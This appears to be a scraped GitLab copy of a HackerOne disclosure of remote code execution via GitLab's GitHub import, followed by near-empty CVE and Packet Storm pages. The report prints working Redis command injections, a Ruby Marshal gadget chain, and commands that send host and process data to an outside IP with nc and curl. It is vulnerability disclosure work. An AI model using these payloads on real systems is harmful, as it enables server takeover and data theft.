=== Content from gitlab.com_6f4fe1f1_20250114_221258.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# RCE via github import

**[HackerOne report #1672388](https://hackerone.com/reports/1672388)** by `yvvdwf` on 2022-08-17, assigned to [@nmalcolm](/nmalcolm "Nick Malcolm"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

While continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.

Gitlab uses Octokit to get data from github.com. Octokit uses [Sawyer::Resource](https://github.com/lostisland/sawyer/blob/master/lib/sawyer/resource.rb) to represent results.

Sawyer is a crazy class that [converts](https://github.com/lostisland/sawyer/blob/f5f080d5c5260e094069139ffc7c13d0acba4ab5/lib/sawyer/resource.rb#L81) a hash to an object whose methods are based on the hash's key:

```
irb(main):641:0> Sawyer::VERSION
=> "0.8.2"
irb(main):642:0> a = Sawyer::Resource.new( Sawyer::Agent.new(""), to_s: "example", length: 1)
=>
{:to_s=>"example", :length=>1}
...
irb(main):643:0> a.to_s
=> "example"
irb(main):644:0> a.length
=> 1
```

Gitlab uses directly the responded Sawyer object in few functions, such as, the `id` variable in [this function](https://gitlab.com/gitlab-org/gitlab/-/blob/99f5db917a33ad9466f35918a1da454ed397be8e/lib/gitlab/github_import/parallel_scheduling.rb#L145):

```
      def already_imported?(object)
        id = id_for_already_imported_cache(object)

        Gitlab::Cache::Import::Caching.set_includes?(already_imported_cache_key, id)
      end
```

Normally, `id` should be a number. However when `id` is `{"to_s": {"bytesize": 2, "to_s": "1234REDIS_COMMANDS" }}`, we can inject additional redis commands by using `bytesize` to limit the previous command when it [is constructed](https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L8) (although the `bytesize` is `2` we need to reserve 4 bytes as 2 additional bytes for CLRF):

```
      def build_command(args)
        command = [nil]

        args.each do |i|
          if i.is_a? Array
            i.each do |j|
              j = j.to_s
              command << "$#{j.bytesize}"
              command << j
            end
          else
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
          end
        end
```

As we can execute any redis commands, we can escalate to execute any Bash command by using an existing gadget, for example:

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \').read\"],"queue\":\"system_hook_push\"}"
```

I tested this redis command first on my own gitlab instance and it worked.

I then tested on gitlab.com but got nothing. I tried another by replacing basically `nc` by `curl` but no luck:

```
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\"], \"queue\":\"system_hook_push\"}"
```

Although the gadget above works well on my local instance but gitlab SaaS which may be protected somehow or used another redis namespace for Sidekiq, even another redis instance. So I used then the basic redis command `REPLICAOF 51.75.74.52 11211\n\n` to test gitlab.com and I got a ping from your redis server to my server `nc -vlkp 11211`:

[![redis_replicaof.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/d03e855b06e8dce3fd5caea2d72edc2bcfce0b56/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61356363616366622d336139322d343431332d393135632d6262646631343032303966632f72656469735f7265706c6963616f662e706e67)

This means that I have the full control on the redis. After seeing the pings, I immediately turned off the replication by executing the redis command `REPLICAOF no one\n\n`. No information from your redis server has been replicated to mine as I used `nc` and I got only the `ping` messages.

By checking on my local instance at `/var/opt/gitlab/redis/redis.conf`, I see that only `keys` command is disable. I did not try `FLUSHALL` to write data to file as it is too dangerous.

As gitlab uses redis as a cache storage, so I tried to reach RCE via `Marshal.dump` method. I tested the following payload on gitlab.com to poison the avatar of my project via the key `cache:gitlab:avatar:yvvdwf/xss:16210710`:

```
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\".(hostname; ps aux) | nc 51.75.74.52 11211\u0006;\fT;\u0012:\fresolve\r\n\r\n
```

Although I did not get RCE but it seems working as I got `500` error code when trying to access to my project. And now I cannot access to my project via web interface. I think I should stop testing to avoid any further potential incidences. I did all the tests above on gitlab.com on 16-17 August 2022 from IP `51.75.74.52`

[![something_went_wrong.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/0d9f431f65ccc1c5541cb06ea688bb80e9d5199b/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62336232316536332d666664352d346439662d393362612d3434656330636362613264622f736f6d657468696e675f77656e745f77726f6e672e706e67)

### Steps to reproduce

The steps to reproduce should be the same as this [one](https://hackerone.com/reports/1665658)

The following steps are to reproduce on a local gitlab instance whose domain is `http://gitlab.example.com`:

### Step to reproduce

To reproduce, we need the following prerequisite:

* A VM/machine to host the dummy server with an public IP though that gitlab.example.com can access to (or you can configure your gitlab instance to allow to access to local networks)
* I created the dummy server using nodejs, so you need to have also nodejs on the machine
* A Gitlab personal access token. Go to <http://gitlab.example.com/-/profile/personal_access_tokens?scopes=api> to create a new token with within `api` scope.

### Step 1: run the dummy server

* Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`
* *Modify the attack payload* as you need inside `redis_command.txt` file, the default value is to execute the command `(hostname; ps aux) > /tmp/ahihi`:

```
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\"], \"queue\":\"system_hook_push\"}"
```

* Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`

### Step 2: trigger Gitlab import

* Open a new terminal, then run the following command, in which:

  + `YOUR_IP` and `YOUR_PORT` are the values in the previous step
  + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement
  + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name

```
curl -kv "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "356289002",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "poc-rce",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

For example:

```
curl "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "root",
    "new_name": "NEW-NAME-'$(date +%s)'",
    "github_hostname": "http://ns.yvvdwf.me:80"
}'
```

* View the result in `/etc/ahihi`

#### Impact

Any one the the ability to call `api/v4/import/github` endpoint could achieve RCE via a specially crafted responses

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [redis\_replicaof.png](https://h1.sec.gitlab.net/a/a5ccacfb-3a92-4413-915c-bbdf140209fc/redis_replicaof.png)
* [something\_went\_wrong.png](https://h1.sec.gitlab.net/a/b3b21e63-ffd5-4d9f-93ba-44ec0ccba2db/something_went_wrong.png)
* [rce.tar.gz](https://h1.sec.gitlab.net/a/4db3a1a0-00bf-432f-a28a-e39ab0cc1f35/rce.tar.gz)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_8cd4452e_20250114_221257.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-2884.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-2884.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-2884.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-2884.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Oct 17, 2022

  [f3956c41](/gitlab-org/cves/-/commit/f3956c415f5e193d1323c5257ba7fcb433979888)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/f3956c415f5e193d1323c5257ba7fcb433979888)
  ·
  f3956c41

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Oct 17, 2022

  f3956c41

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/f3956c415f5e193d1323c5257ba7fcb433979888)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Oct 17, 2022

Loading



=== Content from packetstormsecurity.com_5885c4b2_20250114_221257.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


